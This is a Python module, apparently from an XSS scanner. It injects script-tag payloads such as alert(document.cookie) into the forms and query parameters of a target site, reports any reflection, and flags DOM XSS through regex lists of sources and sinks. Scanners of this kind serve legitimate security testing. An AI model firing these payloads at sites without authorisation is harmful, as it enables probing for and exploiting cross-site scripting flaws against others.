import re
from random import randint
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from .Log import *
from .color import end, red, yellow


class core:

    session = None

    @classmethod
    def generate(self, eff):
        FUNCTION = [
            "prompt(5000/200)",
            "alert(6000/3000)",
            "alert(document.cookie)",
            "prompt(document.cookie)",
            "console.log(5000/3000)"
        ]
        if eff == 1:
            return "<script/>" + FUNCTION[randint(0, 4)] + "<\script\>"

        elif eff == 2:
            return "<\script/>" + FUNCTION[randint(0, 4)] + "<\\script>"

        elif eff == 3:
            return "<\script\> " + FUNCTION[randint(0, 4)] + "<//script>"

        elif eff == 4:
            return "<script>" + FUNCTION[randint(0, 4)] + "<\script/>"

        elif eff == 5:
            return "<script>" + FUNCTION[randint(0, 4)] + "<//script>"

        elif eff == 6:
            return "<script>" + FUNCTION[randint(0, 4)] + "</script>"

    @classmethod
    def post_method(self):
        bsObj = BeautifulSoup(self.body, "html.parser")
        forms = bsObj.find_all("form", method=True)

        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = self.url

            if form["method"].lower().strip() == "post":
                Log.warning("Target have form with POST method: " + C + urljoin(self.url, action))
                Log.info("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})

                        else:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + self.payload)
                            keys.update({key["name"]: self.payload})

                    except Exception as e:
                        Log.info("Internal error: " + str(e))

                Log.info("Sending payload (POST) method...")
                req = self.session.post(urljoin(self.url, action), data=keys)
                if self.payload in req.text:
                    Log.high("Detected XSS (POST) at " + urljoin(self.url, req.url))
                    Log.high("Post data: " + str(keys))
                else:
                    Log.info("This page is safe from XSS (POST) attack but not 100% yet...")

    @classmethod
    def get_method_form(self):
        bsObj = BeautifulSoup(self.body, "html.parser")
        forms = bsObj.find_all("form", method=True)

        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = self.url

            if form["method"].lower().strip() == "get":
                Log.warning("Target have form with GET method: " + C + urljoin(self.url, action))
                Log.info("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})

                        else:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + self.payload)
                            keys.update({key["name"]: self.payload})

                    except Exception as e:
                        Log.info("Internal error: " + str(e))
                        try:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + self.payload)
                            keys.update({key["name"]: self.payload})
                        except KeyError as e:
                            Log.info("Internal error: " + str(e))

                Log.info("Sending payload (GET) method...")
                req = self.session.get(urljoin(self.url, action), params=keys)
                if self.payload in req.text:
                    Log.high("Detected XSS (GET) at " + urljoin(self.url, req.url))
                    Log.high("GET data: " + str(keys))
                else:
                    Log.info("This page is safe from XSS (GET) attack but not 100% yet...")

    @classmethod
    def get_method(self):
        bsObj = BeautifulSoup(self.body, "html.parser")
        links = bsObj.find_all("a", href=True)
        for a in links:
            url = a["href"]
            if url.startswith("http://") is False or url.startswith("https://") is False or url.startswith(
                    "mailto:") is False:
                base = urljoin(self.url, a["href"])
                query = urlparse(base).query
                if query != "":
                    Log.warning("Found link with query: " + G + query + N + " Maybe a vuln XSS point")

                    query_payload = query.replace(query[query.find("=") + 1:len(query)], self.payload, 1)
                    test = base.replace(query, query_payload, 1)

                    query_all = base.replace(query, urlencode({x: self.payload for x in parse_qs(query)}))

                    Log.info("Query (GET) : " + test)
                    Log.info("Query (GET) : " + query_all)

                    _respon = self.session.get(test)
                    if self.payload in _respon.text or self.payload in self.session.get(query_all).text:
                        Log.high("Detected XSS (GET) at " + _respon.url)
                    else:
                        Log.info("This page is safe from XSS (GET) attack but not 100% yet...")

    # add dom method
    def dom(self, response):
        highlighted = []
        # highlighted.append("For Scanning " + self.url)
        sources = r'''\b(?:document\.(URL|documentURI|URLUnencoded|baseURI|cookie|referrer)|location\.(href|search|hash|pathname)|window\.name|history\.(pushState|replaceState)(local|session)Storage)\b'''
        sinks = r'''\b(?:eval|evaluate|execCommand|assign|navigate|getResponseHeaderopen|showModalDialog|Function|set(Timeout|Interval|Immediate)|execScript|crypto.generateCRMFRequest|ScriptElement\.(src|text|textContent|innerText)|.*?\.onEventName|document\.(write|writeln)|.*?\.innerHTML|Range\.createContextualFragment|(document|window)\.location)\b'''
        scripts = re.findall(r'(?i)(?s)<script[^>]*>(.*?)</script>', response)
        sinkFound, sourceFound = False, False
        for script in scripts:
            script = script.split('\n')
            allControlledVariables = set()
            try:
                for newLine in script:
                    line = newLine
                    parts = line.split('var ')
                    controlledVariables = set()
                    if len(parts) > 1:
                        for part in parts:
                            for controlledVariable in allControlledVariables:
                                if controlledVariable in part:
                                    controlledVariables.add(
                                        re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]+', part).group().replace('$', '\$'))
                    pattern = re.finditer(sources, newLine)
                    for grp in pattern:
                        if grp:
                            source = newLine[grp.start():grp.end()].replace(' ', '')
                            if source:
                                if len(parts) > 1:
                                    for part in parts:
                                        if source in part:
                                            controlledVariables.add(
                                                re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]+', part).group().replace('$', '\$'))
                                line = line.replace(source, yellow + source + end)
                    for controlledVariable in controlledVariables:
                        allControlledVariables.add(controlledVariable)
                    for controlledVariable in allControlledVariables:
                        matches = list(filter(None, re.findall(r'\b%s\b' % controlledVariable, line)))
                        if matches:
                            sourceFound = True
                            line = re.sub(r'\b%s\b' % controlledVariable, yellow + controlledVariable + end, line)
                    pattern = re.finditer(sinks, newLine)
                    for grp in pattern:
                        if grp:
                            sink = newLine[grp.start():grp.end()].replace(' ', '')
                            if sink:
                                line = line.replace(sink, red + sink + end)
                                sinkFound = True
                    if line != newLine:
                        highlighted.append('%s' % (line.lstrip(' ')))
            except MemoryError:
                pass
        if sinkFound or sourceFound:
            return highlighted
        else:
            return []

    @classmethod
    def main(self, url, proxy, headers, payload, cookie, method=2):

        print(W + "*" * 15)
        self.payload = payload
        self.url = url

        self.session = session(proxy, headers, cookie)
        Log.info("Checking connection to: " + Y + url)

        try:
            ctr = self.session.get(url)
            self.body = ctr.text
            # 调用 dom 方法
            highlighted = self.dom(self, ctr.text)
            if highlighted:
                Log.high("Detected potential XSS-DOM-based vulnerabilities at: "+ self.url)
                print("-" * 60)
                for line in highlighted:
                    print(line)
                print("-" * 60)
            else:
                Log.info("No potential XSS-DOM-based vulnerabilities found.")

        except Exception as e:
            Log.high("Internal error: " + str(e))
            return

        if ctr.status_code > 400:
            Log.info("Connection failed " + G + str(ctr.status_code))
            return
        else:
            Log.info("Connection estabilished " + G + str(ctr.status_code))

        if method >= 2:
            self.post_method()
            self.get_method()
            self.get_method_form()

        elif method == 1:
            self.post_method()

        elif method == 0:
            self.get_method()
            self.get_method_form()


